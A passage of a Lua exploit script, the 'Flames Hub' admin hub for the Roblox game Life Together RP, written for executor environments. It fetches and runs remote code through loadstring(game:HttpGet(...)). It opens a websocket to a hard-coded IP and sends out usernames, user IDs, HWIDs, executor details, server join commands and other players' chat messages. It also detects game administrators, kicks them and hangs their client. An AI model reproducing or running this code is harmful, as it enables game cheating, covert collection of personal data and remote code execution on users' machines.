if not game:IsLoaded() then
   local msg_instance = Instance.new("Message")
   local hint_instance = Instance.new("Hint")

   msg_instance.Text = "Flames Hub is waiting for the current experience to load fully."
   hint_instance.Text = "Flames Hub is currently waiting for the game to load."
   if typeof(workspace) == "Instance" and workspace.Parent == game then -- real checking, that's how we do it in Flames Hub.
      msg_instance.Parent = workspace
      hint_instance.Parent = workspace
   end
   game.Loaded:Wait()
   if game.Players then
      local ok, response = pcall(function()
         game.Players:CreateLocalPlayer()
      end)

      if not ok then
         if getgenv().notify then
            getgenv().notify("Warning", "Could not create LocalPlayer, response: "..tostring(response), 12)
         else
            warn("Could not create LocalPlayer because: "..tostring(response))
         end
         if not getgenv().LocalPlayer then
            local localplayer = game.Players.LocalPlayer or game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
            getgenv().LocalPlayer = localplayer
         end
      else
         if getgenv().notify then
            getgenv().notify("Success", "Got response: "..tostring(response), 6)
         else
            print("Created LocalPlayer, got response: "..tostring(response))
         end
         if not getgenv().LocalPlayer then
            local localplayer = game.Players.LocalPlayer or game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
            getgenv().LocalPlayer = localplayer
         end
      end
   end
else
   local localplayer = game.Players.LocalPlayer or game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
   getgenv().LocalPlayer = localplayer
   if not getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client then
      if getgenv().notify then
         getgenv().notify("Success", "Got LocalPlayer: "..tostring(getgenv().LocalPlayer), 5)
      end
   end
end
wait(0.1)
local has_gethui = (typeof(get_hui) == "function") or (typeof(getgenv().get_hui) == "function")
local has_gethidden = (typeof(get_hidden_gui) == "function") or (typeof(getgenv().get_hidden_gui) == "function")

if not has_gethui and not has_gethidden and not getgenv().roblox_hidden_gui_location then
   local CoreGui = getgenv().CoreGui or cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
   getgenv().roblox_hidden_gui_location = getgenv().roblox_hidden_gui_location or nil

   if not getgenv().roblox_hidden_gui_location then
      for _, v in ipairs(CoreGui:GetChildren()) do
         if v:IsA("ScreenGui") and v.Name == "RobloxGui" then
            getgenv().roblox_hidden_gui_location = v
         end
      end
   end

   getgenv().get_hui = function()
      if getgenv().roblox_hidden_gui_location and getgenv().roblox_hidden_gui_location:IsA("ScreenGui") then
         return getgenv().roblox_hidden_gui_location
      else
         return CoreGui
      end
   end

   getgenv().get_hidden_gui = function()
      if getgenv().roblox_hidden_gui_location and getgenv().roblox_hidden_gui_location:IsA("ScreenGui") then
         return getgenv().roblox_hidden_gui_location
      else
         return CoreGui
      end
   end
end

local verify_file = "is_verified_in_Flames_Hub.txt"
local Raw_Version = "V8.6.3"
getgenv().Script_Version = tostring(Raw_Version).."-LifeAdmin"
getgenv().Script_Creator = "©️ FLAMES HUB | LLC ©️"
local Insert = table.insert

-- [[ for the Command Handler, because it can check if there is a number in a string (like a command you send). ]] -- 
getgenv().Is_Integer_In_Str = function(str)
   if type(str) == "number" then
      return str % 1 == 0
   end

   if type(str) == "string" then
      return str:match("^-?%d+$") ~= nil
   end

   return false
end

-- [[ NEW!: makes it way fucking easier to find attributes. ]] --
getgenv()._attr_cache = getgenv()._attr_cache or {}
getgenv().attr_cached_fuzzy = function(obj, search)
   if not obj or not obj.Parent then return nil end

   local cache = getgenv()._attr_cache[obj]

   if cache then
      for name, value in pairs(cache) do
         if name:lower():find(search:lower(), 1, true) then
            return value
         end
      end
      return nil
   end

   local ok, attrs = pcall(function()
      return obj:GetAttributes()
   end)

   if not ok or not attrs then return nil end

   getgenv()._attr_cache[obj] = attrs

   for name, value in pairs(attrs) do
      if name:lower():find(search:lower(), 1, true) then
         return value
      end
   end

   return nil
end

getgenv().attr_main_checker = function(obj, attr, expected) -- really just used for things like the LocalPlayer's attributes tbh, probably just gonna use my fuzzy searcher + cacher though.
   local ok, result = pcall(function()
      return obj:GetAttribute(attr)
   end)
   return ok and result == expected
end

getgenv().isProperty = getgenv().isProperty or function(inst, prop)
	local s, r = pcall(function() return inst[prop] end)
	if not s then return nil end
	return r
end

getgenv().hasProp = getgenv().hasProp or function(inst, prop)
   return inst and isProperty(inst, prop) ~= nil
end

getgenv().setProperty = getgenv().setProperty or function(inst, prop, v)
	local s, _ = pcall(function() inst[prop] = v end)
	return s
end

getgenv().safeSet = getgenv().safeSet or function(inst, prop, val)
   if inst and hasProp(inst, prop) then setProperty(inst, prop, val) end
end

local function isVerified()
   if not isfile then return false end
   if not isfile(verify_file) then return false end
   local content = readfile(verify_file)
   return type(content) == "string" and content:lower():find("true") ~= nil
end

local function setVerified()
   if writefile then
      writefile(verify_file, "true")
   end
end

local function waitForGuiGone()
   local CoreGui = getgenv().CoreGui or cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
   while CoreGui:FindFirstChild("MemoryMinigameGUI") do
      task.wait()
   end
end

getgenv().disabled_global_value_correctly = function(input)
   local ok, result = pcall(function()
      return input
   end)

   if not ok then
      return true
   end

   return not result
end

if not getgenv().GlobalEnvironmentFramework_Initialized then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/GlobalEnv_Framework.lua"))()
	wait(0.1)
	getgenv().GlobalEnvironmentFramework_Initialized = true
end
wait(0.2)
getgenv().Start_Actual_Flames_Hub_Script = function()
   getgenv().LifeTogether_Actual_Flames_Hub_Running_Functioning_Currently_On_Client = true
   local userid = game.Players.LocalPlayer.UserId
   local http = getgenv().HttpService or game:GetService("HttpService")
   local function mask_unique_id(id)
      if not id then return nil end

      local parts = string.split(id, "-")
      local out = {}

      for i = 1, #parts do
         if i <= 2 then
            out[i] = parts[i]
         else
            out[i] = string.rep("*", #parts[i])
         end
      end

      return table.concat(out, "-")
   end

   function create_flames_hub_unique_id(target_user_id)
      local file_name = "flames_hub_unique_ID.txt"

      if userid ~= target_user_id then
         return nil
      end

      if isfile and isfile(file_name) then
         local id = readfile and readfile(file_name)
         if id and id ~= "" then
            return id
         end
      end

      local new_id = http:GenerateGUID(false)
      pcall(function() writefile(file_name, new_id) end)

      return new_id
   end

   function get_flames_hub_unique_id()
      local file_name = "flames_hub_unique_ID.txt"

      if isfile and isfile(file_name) then
         local id = readfile and readfile(file_name)
         if id and id ~= "" then
            return id
         end
      end

      return nil
   end

   function create_masked_flames_hub_unique_server_id(target_user_id)
      local raw = create_flames_hub_unique_id(target_user_id)
      return mask_unique_id(raw)
   end

   function get_masked_flames_hub_unique_id()
      local raw = get_flames_hub_unique_id()
      return mask_unique_id(raw)
   end
   wait(0.1)
   loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/FakeChatGUI/refs/heads/main/handler.lua"))()

   local Chat = (cloneref and cloneref(game:GetService("Chat"))) or game:GetService("Chat")
   local Players = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
   local me = game:GetService("Players").LocalPlayer
   local TextChatService = cloneref and cloneref(game:GetService("TextChatService")) or game:GetService("TextChatService")
   local ws_connect = (syn and syn.websocket and syn.websocket.connect) or (WebSocket and WebSocket.connect) or (websocket and websocket.connect)

   getgenv().will_tag = function(text)
      local filtered
      local success, response = pcall(function()
         filtered = Chat:FilterStringForBroadcast(text, me)
      end)
      if not success then print(tostring(response)) return true end
      return filtered ~= text
   end

   local HttpService = getgenv().HttpService or cloneref and cloneref(game:GetService("HttpService")) or game:GetService("HttpService")
   if not getgenv().FlamesHub_WebSocket_Server_Already_Initialized_For_Internal_Use_Life_Together_RP then
      getgenv().FlamesHub_WebSocket_Server_Already_Initialized_For_Internal_Use_Life_Together_RP = true

      getgenv().ws_main_reactor_connector = getgenv().ws_main_reactor_connector or nil
      getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set = getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set or false
      local function connect_to_public_server()
         if getgenv().FlamesHub_Reconnecting then return end
         getgenv().FlamesHub_Reconnecting = true
         getgenv().ws_main_reactor_connector = ws_connect("ws://50.116.35.248:8080")
         getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set = true
         getgenv().FlamesHub_Retry_Delay = 0.15
         getgenv().FlamesHub_Reconnecting = false
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "join",
            server = game.JobId,
            user = game.Players.LocalPlayer.Name
         }))

         getgenv().ws_main_reactor_connector.OnClose:Connect(function()
            getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set = false
            getgenv().FlamesHub_Retry_Delay = math.min((getgenv().FlamesHub_Retry_Delay or 0.15) * 2, 30)
            task.wait(getgenv().FlamesHub_Retry_Delay)
            connect_to_public_server()
         end)
      end

      connect_to_public_server()

      getgenv().Send_Main_Log = function(data)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end
         local join_command = "```game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)```"
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "warn",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               content = "[log]: " .. os.date("%Y-%m-%d %H:%M:%S"),
               embeds = {{
                  title = "Logged Execution:",
                  description = "An execution was caught from the Admin.",
                  color = 3091754,
                  fields = {
                     { name = "UserName",        value = tostring(game.Players.LocalPlayer.Name),                              inline = true  },
                     { name = "DisplayName",      value = tostring(game.Players.LocalPlayer.DisplayName or ""),                inline = true  },
                     { name = "UserID",           value = tostring(game.Players.LocalPlayer.UserId),                          inline = true  },
                     { name = "Script Version",   value = tostring(getgenv().Script_Version or "?"),                          inline = true  },
                     { name = "Packet",           value = tostring(data.packet or "?"),                                       inline = false },
                     { name = "Place-ID",         value = tostring(game.PlaceId),                                             inline = false },
                     { name = "Job-ID",           value = tostring(game.JobId),                                               inline = false },
                     { name = "Executor Name",    value = tostring(data.executor or "?"),                                     inline = false },
                     { name = "Device",           value = tostring(data.device or "?"),                                       inline = false },
                     { name = "Flames UUID",      value = tostring(data.uuid or "?"),                                         inline = false },
                     { name = "HWID",             value = tostring(data.hwid or "?"),                                         inline = false },
                     { name = "Join Server",      value = join_command,                                                       inline = false },
                     { name = "Player Count",     value = #getgenv().Players:GetPlayers() .. "/" .. getgenv().Players.MaxPlayers, inline = false },
                     { name = "Current Players",  value = tostring(data.current_players or "?"),                              inline = false },
                     { name = "Full Server?",     value = getgenv().is_server_full() and "Yes" or "No",                      inline = false },
                  },
                  timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
               }}
            }
         }))
      end

      getgenv().Send_Main_Alert = function(sender, message)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "alert",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               embeds = {{
                  title = "Chat Logged:",
                  description = "A chat message was logged from the Life Together Admin Commands script.",
                  color = 10181046,
                  fields = {
                     { name = "Sender UserName", value = tostring(sender.Name),              inline = true  },
                     { name = "DisplayName",     value = tostring(sender.DisplayName or ""), inline = true  },
                     { name = "UserID",          value = tostring(sender.UserId),            inline = true  },
                     { name = "Message",         value = tostring(message or ""),            inline = false },
                     { name = "Time (UTC)",      value = os.date("!%Y-%m-%d %H:%M:%S"),     inline = true  },
                     { name = "Script Version",  value = tostring(getgenv().Script_Version_GlobalGenv), inline = true },
                  }
               }}
            }
         }))
      end

      getgenv().Send_Main_Warn = function(sender, message)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "issues",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               embeds = {{
                  title = "Flames Server | Chat Log:",
                  description = "A message was logged from the Flames Hub | WebSocket Server.",
                  color = 10181046,
                  fields = {
                     { name = "Sender UserName", value = tostring(sender.Name),              inline = true  },
                     { name = "DisplayName",     value = tostring(sender.DisplayName or ""), inline = true  },
                     { name = "UserID",          value = tostring(sender.UserId),            inline = true  },
                     { name = "Message",         value = tostring(message or ""),            inline = false },
                     { name = "Time (UTC)",      value = os.date("!%Y-%m-%d %H:%M:%S"),     inline = true  },
                     { name = "Script Version",  value = tostring(getgenv().Script_Version_GlobalGenv), inline = true },
                     { name = "Server ID",       value = tostring(game.JobId),              inline = true  },
                  }
               }}
            }
         }))
      end

      getgenv().Send_Main_Issues = function(text)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "warnings",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               content = tostring(text or "")
            }
         }))
      end

      getgenv().Send_Main_Warns = function(sender, command)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end
         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "warns",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               embeds = {{
                  title = "Command Logged:",
                  description = "A Command was executed from the Life Together Admin Commands script.",
                  color = 10181046,
                  fields = {
                     { name = "Sender UserName", value = tostring(sender.Name),              inline = true  },
                     { name = "DisplayName",     value = tostring(sender.DisplayName or ""), inline = true  },
                     { name = "UserID",          value = tostring(sender.UserId),            inline = true  },
                     { name = "Command",         value = tostring(command or ""),            inline = false },
                     { name = "Time (UTC)",      value = os.date("!%Y-%m-%d %H:%M:%S"),     inline = true  },
                     { name = "Script Version",  value = tostring(getgenv().Script_Version_GlobalGenv), inline = true },
                  }
               }}
            }
         }))
      end

      getgenv().Send_Main_Feedback = function(player, message, feedback_type)
         if not getgenv().Connected_To_Current_Flames_Hub_WebSocket_Server_Already_Set then return end

         local type_colors = {
            feedback    = 4360181,
            issue       = 13158400,
            report      = 10027008,
            bug         = 9109504,
         }

         getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode({
            type = "post",
            hook = "feedback",
            user = game.Players.LocalPlayer.Name,
            text = "embed",
            embed = {
               embeds = {{
                  title = feedback_type:gsub("^%l", string.upper),
                  description = "A message was received from the script.",
                  color = type_colors[feedback_type] or 4360181,
                  fields = {
                     { name = "Type",           value = tostring(feedback_type:gsub("^%l", string.upper)), inline = true  },
                     { name = "UserName",       value = tostring(player.Name),                             inline = true  },
                     { name = "DisplayName",    value = tostring(player.DisplayName or ""),                inline = true  },
                     { name = "UserID",         value = tostring(player.UserId),                           inline = false },
                     { name = "Message",        value = tostring(message or ""),                           inline = false },
                     { name = "Time (UTC)",     value = os.date("!%Y-%m-%d %H:%M:%S"),                    inline = true  },
                     { name = "Script Version", value = tostring(getgenv().Script_Version_GlobalGenv),     inline = true  },
                     { name = "Job-ID",         value = tostring(game.JobId),                             inline = true  },
                     { name = "Place-ID",       value = tostring(game.PlaceId),                           inline = false },
                     { name = "Executor",       value = tostring(identifyexecutor and identifyexecutor() or "Unknown"), inline = true },
                  }
               }}
            }
         }))
      end
   end

   getgenv().check_anti_stealer = function(target_name, callback)
      local lib = getgenv().FlamesLibrary
      local HttpService = getgenv().HttpService or cloneref and cloneref(game:GetService("HttpService")) or game:GetService("HttpService")
      local resolved = false

      lib.spawn("anti_stealer_check_timeout", "delay", 5, function()
         if not resolved then
            resolved = true
            callback(false, true)
         end
      end)

      lib.connect("anti_stealer_check_result", getgenv().ws_main_reactor_connector.OnMessage:Connect(function(raw)
         local ok, data = pcall(HttpService.JSONDecode, HttpService, raw)
         if not ok or type(data) ~= "table" then return end
         if data.type ~= "anti_stealer_check_result" then return end
         if data.target ~= target_name then return end
         if not resolved then
            resolved = true
            lib.disconnect("anti_stealer_check_timeout")
            lib.disconnect("anti_stealer_check_result")
            callback(data.protected, false)
         end
      end))

      getgenv().ws_main_reactor_connector:Send(HttpService:JSONEncode{
         type = "check_anti_stealer",
         target = target_name
      })
   end

   --[[if not getgenv().AlreadySpoofed_Incoming_Message_Watcher_In_Flames_Hub_Anti_Tag_System then
      getgenv().AlreadySpoofed_Incoming_Message_Watcher_In_Flames_Hub_Anti_Tag_System = true
      if getgenv().notify then
         getgenv().notify("Success", "Flames Hub | Anti-HashTag V2 — has been initialized!", 15)
      end

      TextChatService.OnIncomingMessage = function(message)
         local props = Instance.new("TextChatMessageProperties")
         local textsource = message.TextSource

         if textsource then
            local player = Players:GetPlayerByUserId(textsource.UserId)
            if player == me then
               if will_tag(message.Text) then
                  if getgenv().notify then
                     getgenv().notify("Warning", "Message blocked by: Flames Hub | Anti-Hashtag V2 — it would have hashtagged!", 10)
                  end
                  error("Saved from hashtags!")
               end
            end
         end

         props.Text = message.Text
         return props
      end
   end--]]

   getgenv().Memory_Mini_Game_GUI = function()
      local Players = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
      local CoreGui = cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
      local GRID_SIZE = 5
      local TILE_COUNT = GRID_SIZE * GRID_SIZE
      local SHOW_TIME = 10
      local MAX_MISTAKES = 3
      local GREEN = Color3.fromRGB(0, 255, 0)
      local BLUE = Color3.fromRGB(30, 70, 120)
      local DARK = Color3.fromRGB(20, 20, 20)
      local WHITE = Color3.fromRGB(240, 240, 240)
      local RED = Color3.fromRGB(150, 0, 0)

      if CoreGui:FindFirstChild("MemoryMinigameGUI") then
         CoreGui.MemoryMinigameGUI:Destroy()
      end

      local gui = Instance.new("ScreenGui")
      gui.Name = "MemoryMinigameGUI"
      gui.IgnoreGuiInset = true
      gui.ResetOnSpawn = false
      gui.Parent = CoreGui

      local frame = Instance.new("Frame")
      frame.AnchorPoint = Vector2.new(0.5, 0.5)
      frame.Position = UDim2.fromScale(0.5, 0.5)
      frame.Size = UDim2.fromScale(0.85, 0.85)
      frame.BackgroundColor3 = DARK
      frame.Parent = gui
      Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)

      local aspect = Instance.new("UIAspectRatioConstraint")
      aspect.AspectRatio = 1
      aspect.Parent = frame

      local sizeLimit = Instance.new("UISizeConstraint")
      sizeLimit.MaxSize = Vector2.new(520, 520)
      sizeLimit.Parent = frame

      local padding = Instance.new("UIPadding")
      padding.PaddingTop = UDim.new(0.08, 0)
      padding.PaddingBottom = UDim.new(0.04, 0)
      padding.PaddingLeft = UDim.new(0.04, 0)
      padding.PaddingRight = UDim.new(0.04, 0)
      padding.Parent = frame

      local cancel = Instance.new("TextButton")
      cancel.Size = UDim2.fromScale(0.18, 0.08)
      cancel.Position = UDim2.fromScale(0.99, 0.02)
      cancel.AnchorPoint = Vector2.new(1, 0)
      cancel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      cancel.Text = "Cancel"
      cancel.TextScaled = true
      cancel.Font = Enum.Font.GothamBold
      cancel.TextColor3 = WHITE
      cancel.Parent = frame
      Instance.new("UICorner", cancel).CornerRadius = UDim.new(0, 12)

      local gridFrame = Instance.new("Frame")
      gridFrame.BackgroundTransparency = 1
      gridFrame.Size = UDim2.fromScale(1, 0.88)
      gridFrame.Position = UDim2.fromScale(0, 0.12)
      gridFrame.Parent = frame

      local grid = Instance.new("UIGridLayout")
      grid.CellPadding = UDim2.fromScale(0.03, 0.03)
      grid.CellSize = UDim2.fromScale(1 / GRID_SIZE - 0.03, 1 / GRID_SIZE - 0.03)
      grid.Parent = gridFrame

      local tiles = {}
      local pattern = {}
      local found = {}
      local mistakes = 0
      local function cleanup()
         if gui then
            gui:Destroy()
         end
      end

      cancel.MouseButton1Click:Connect(function()
         if getgenv().notify then
            getgenv().notify("Info", "Mini-game cancelled.")
         end
         cleanup()
      end)

      for i = 1, TILE_COUNT do
         local btn = Instance.new("TextButton")
         btn.Text = ""
         btn.BackgroundColor3 = BLUE
         btn.AutoButtonColor = false
         btn.Parent = gridFrame
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
         tiles[i] = btn
      end

      local function generatePattern()
         local count = math.random(6, 9)
         local used = {}
         while #pattern < count do
            local pick = math.random(1, TILE_COUNT)
            if not used[pick] then
               used[pick] = true
               table.insert(pattern, pick)
            end
         end
      end

      local function checkWin()
         for _, index in ipairs(pattern) do
            if not found[index] then
               return
            end
         end
         task.delay(0.3, function()
            if getgenv().notify then
               getgenv().notify("Success", "You completed the memory mini-game.")
            end
            cleanup()
         end)
      end

      local function showPattern()
         for _, index in ipairs(pattern) do
            tiles[index].BackgroundColor3 = GREEN
         end
      end

      local function hidePattern()
         for i, btn in ipairs(tiles) do
            if not found[i] then
               btn.BackgroundColor3 = BLUE
            end
         end
      end

      local function fail()
         if getgenv().notify then
            getgenv().notify("Error", "You failed the memory mini-game, continue anyway.")
         end
         cleanup()
      end

      local function onTileClicked(index)
         if found[index] then return end
         if table.find(pattern, index) then
            found[index] = true
            tiles[index].BackgroundColor3 = GREEN
            checkWin()
         else
            mistakes = mistakes + 1
            tiles[index].BackgroundColor3 = RED
            if mistakes >= MAX_MISTAKES then
               fail()
            end
         end
      end

      for i, btn in ipairs(tiles) do
         btn.MouseButton1Click:Connect(function()
            onTileClicked(i)
         end)
      end

      generatePattern()
      showPattern()
      task.delay(SHOW_TIME, hidePattern)
   end
   wait(0.2)
   create_flames_hub_unique_id(game.Players.LocalPlayer.UserId)
   wait(0.3)
   local flames_unique_server_ID = get_flames_hub_unique_id()
   local masked_flames_hub_server_ID = get_masked_flames_hub_unique_id()
   getgenv().masked_flames_hub_server_ID = masked_flames_hub_server_ID
   wait(0.1)
   if not isVerified() then
      if getgenv().notify then
         getgenv().notify("Warning", "Please complete this one time verification to boot into Flames Hub | Admin!", 45)
      end
      getgenv().Memory_Mini_Game_GUI()

      waitForGuiGone()

      setVerified()
      if getgenv().notify then
         getgenv().notify("Success", "You have been verified in Flames Hub successfully.", 15)
         getgenv().notify("Success", "Your special Flames Hub GUID: "..tostring(masked_flames_hub_server_ID), 11)
      end
   else
      getgenv().notify("Success", "We have verified you in our system | has already completed verification.", 20)
      getgenv().notify("Success", "Your special Flames Hub GUID: "..tostring(masked_flames_hub_server_ID), 10)
   end
   wait(0.1)
   getgenv().safe_wrapper = getgenv().safe_wrapper or function(service)
      if cloneref then
         return cloneref(game:GetService(service))
      else
         return game:GetService(service)
      end
   end

   local g = getgenv()
   local replicate_sig_func = replicatesignal or replicate_signal or DeltaSignal
   local set_hid_func = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
   getgenv().FlamesLibrary = getgenv().FlamesLibrary or {}
   getgenv().FlamesLibrary._connections = getgenv().FlamesLibrary._connections or {}
   getgenv().originalIO = getgenv().originalIO or {}
   getgenv().spectateConns = getgenv().spectateConns or {}
   getgenv().FlamesLibrary.connect = function(name, connection)
      getgenv().FlamesLibrary._connections[name] = getgenv().FlamesLibrary._connections[name] or {}
      table.insert(getgenv().FlamesLibrary._connections[name], connection)
      return connection
   end

   getgenv().FlamesLibrary.disconnect = function(name)
      local list = getgenv().FlamesLibrary._connections[name]
      if not list then return end
      getgenv().FlamesLibrary._connections[name] = nil

      for _, item in ipairs(list) do
         if typeof(item) == "RBXScriptConnection" then
            pcall(function() item:Disconnect() end)
         elseif type(item) == "thread" then
            pcall(task.cancel, item)
         end
      end
   end

   getgenv().FlamesLibrary.wait = function(t)
      if not t or t <= 0 then
         safe_wrapper("RunService").Heartbeat:Wait()
         return
      end
      local ok = pcall(task.wait, t)
      if not ok then
         safe_wrapper("RunService").Heartbeat:Wait()
      end
   end

   -- [[ main source function fixed for PC. ]] --
   getgenv().FlamesLibrary.spawn = function(name, mode, func, ...)
      if getgenv().FlamesLibrary._connections[name] then getgenv().FlamesLibrary.disconnect(name) end
      getgenv().FlamesLibrary._connections[name] = {}
      local thread

      if mode == "spawn" then
         thread = task.spawn(func, ...)
      elseif mode == "defer" then
         thread = task.defer(func, ...)
      elseif mode == "delay" then
         local delay_time = ...
         thread = task.delay(delay_time, func)
      elseif mode == "wrap" then
         thread = coroutine.create(func)
         coroutine.resume(thread, ...)
      else
         -- don't really need a warning --
         -- warn("Invalid spawn mode / argument: "..tostring(mode))
         return
      end

      table.insert(getgenv().FlamesLibrary._connections[name], thread)
      return thread
   end

   getgenv().FlamesLibrary.is_thread_alive = function(thread)
      if type(thread) ~= "thread" then
         return false
      end

      local success, status = pcall(coroutine.status, thread)
      if not success then
         return false
      end

      return status ~= "dead"
   end

   getgenv().FlamesLibrary.is_alive = function(name)
      local list = getgenv().FlamesLibrary._connections[name]
      if not list then return false end

      for _, item in ipairs(list) do
         if typeof(item) == "RBXScriptConnection" then
            if item.Connected then return true end
         elseif type(item) == "thread" then
            if getgenv().FlamesLibrary.is_thread_alive(item) then return true end
         end
      end

      return false
   end

   getgenv().FlamesLibrary.cleanup_all = function()
      local names = {}
      for name in pairs(getgenv().FlamesLibrary._connections) do
         table.insert(names, name)
      end
      for _, name in ipairs(names) do
         getgenv().FlamesLibrary.disconnect(name)
      end
      getgenv().notify("Success", "Cleaned up all concurrent threads/connections.", 7)
   end

   local fw = getgenv().FlamesLibrary.wait
   local name = "administrator_watcher_conn_Flames_Hub"

   if not getgenv().FlamesLibrary.is_alive(name) then
      getgenv().FlamesLibrary.spawn(name, "spawn", function()
         while true do
            local ok, err = pcall(function()
               local player = getgenv().LocalPlayer

               if player and player:GetAttribute("has_administrative_powers") then
                  pcall(function() player:Kick("We know you're an administrator of Life Together RP! Flames Hub automatically bans these suspected players, YOU'RE NOT WELCOME! Get owned.") end)
                  wait(2)
                  while true do end
               end
               fw(.1)
            end)
         end
      end)
   end

   originalIO.ensureCam = function(spectateTarget)
      if not spectateTarget or not spectateSubject then return end
      if not workspace then return end
      local cam = workspace.CurrentCamera
      if not cam then return end
      if isProperty(cam, "CameraSubject") == nil then return end
      if cam.CameraSubject ~= spectateSubject then
         setProperty(cam, "CameraSubject", spectateSubject)
      end
   end

   originalIO.hookCameraGuard = function(spectateTarget)
      if not workspace then return end
      local cam = workspace.CurrentCamera
      if not cam then return end

      if spectateConns.cam then
         spectateConns.cam:Disconnect()
         spectateConns.cam = nil
      end

      if isProperty(cam, "CameraSubject") ~= nil then
         spectateConns.cam = getgenv().FlamesLibrary.connect("spectate_cam", cam:GetPropertyChangedSignal("CameraSubject"):Connect(function()
            if not spectateTarget or not spectateSubject then return end
            originalIO.ensureCam()
         end))
      end

      if not spectateConns.camW and isProperty(workspace, "CurrentCamera") ~= nil then
         spectateConns.camW = getgenv().FlamesLibrary.connect("spectate_camW", workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
            if not spectateTarget or not spectateSubject then return end
            originalIO.hookCameraGuard()
            originalIO.ensureCam()
         end))
      end
   end

   originalIO.captureIO = function(name)
      local fn

      if rawget then
         fn = rawget(_G, name)
      end

      if type(fn) ~= "function" then
         fn = _G[name]
      end

      if type(fn) == "function" then
         originalIO[name] = fn
      end
   end
   wait(0.1)
   if not originalIO.__captured then
      originalIO.__captured = true
      originalIO.captureIO('readfile')
      originalIO.captureIO('writefile')
      originalIO.captureIO('appendfile')
      originalIO.captureIO('listfiles')
      originalIO.captureIO('makefolder')
      originalIO.captureIO('delfile')
      originalIO.captureIO('delfolder')
      originalIO.captureIO('isfile')
      originalIO.captureIO('isfolder')
   end

   originalIO.pathVariants = function(path)
      if type(path) ~= "string" then
         return { path }
      end
      if path:match('^[%w_]+://') then
         return { path }
      end
      local variants, seen = {}, {}
      local function add(value)
         if type(value) == "string" and value ~= "" and not seen[value] then
            seen[value] = true
            Insert(variants, value)
         end
      end
      add(path)
      add(path:gsub('\\+', '\\'))
      add(path:gsub('//+', '/'))
      add(path:gsub('/', '\\'))
      add(path:gsub('\\', '/'))
      local trimmed = path:gsub('^%.[/\\]+', '')
      if trimmed ~= path then
         add(trimmed)
         add(trimmed:gsub('/', '\\'))
         add(trimmed:gsub('\\', '/'))
      end
      return variants
   end

   originalIO.resolveWithListfiles = function(target)
      local lf = originalIO.listfiles
      if type(lf) ~= "function" then
         return nil
      end
      local dir, filename = target:match('^(.*)[/\\]([^/\\]+)$')
      if not dir or filename == '' then
         return nil
      end
      local dirVariants = originalIO.pathVariants(dir)
      local results = {}
      local lowered = filename:lower()
      for _, candidateDir in ipairs(dirVariants) do
         local ok, entries = pcall(lf, candidateDir)
         if ok and type(entries) == "table" then
            for _, entry in ipairs(entries) do
               local name = entry:match('([^/\\]+)$')
               if name and name:lower() == lowered then
                  Insert(results, entry)
               end
            end
         end
      end
      if #results > 0 then
         return results
      end
      return nil
   end

   getgenv().input_to_String = getgenv().input_to_String or function(input_value) return typeof(input_value) == "string" and input_value or tostring(input_value) end
   if getgenv().notify and typeof(getgenv().notify) == "function" then getgenv().notify("Info", "Booting up Life Together RP Admin, please wait a few moments while we initialize everything...", 8) end
   getgenv().service_cache = getgenv().service_cache or {}
   getgenv().Sound_ID_Windows = "rbxassetid://8183296024"
   getgenv().Sound_ID_iPhone = "rbxassetid://73722479618078"
   getgenv().Sound_ID_Android = "rbxassetid://17582299860"
   getgenv().Sound_ID_Universal = "rbxassetid://18595195017"
   local aliases = {
      rs = "ReplicatedStorage",
      rf = "ReplicatedFirst",
      ws = "Workspace",
      works = "Workspace",
      player = "Players",
      plr = "Players",
      plrs = "Players",
      ts = "TweenService",
      uis = "UserInputService"
   }

   local virtuals = {
      lp = true,
      localplayer = true,
      localplr = true
   }

   local function levenshtein(a, b)
      a = a:lower()
      b = b:lower()

      local len_a, len_b = #a, #b
      if len_a == 0 then return len_b end
      if len_b == 0 then return len_a end

      local matrix = {}

      for i = 0, len_a do
         matrix[i] = {[0] = i}
      end

      for j = 0, len_b do
         matrix[0][j] = j
      end

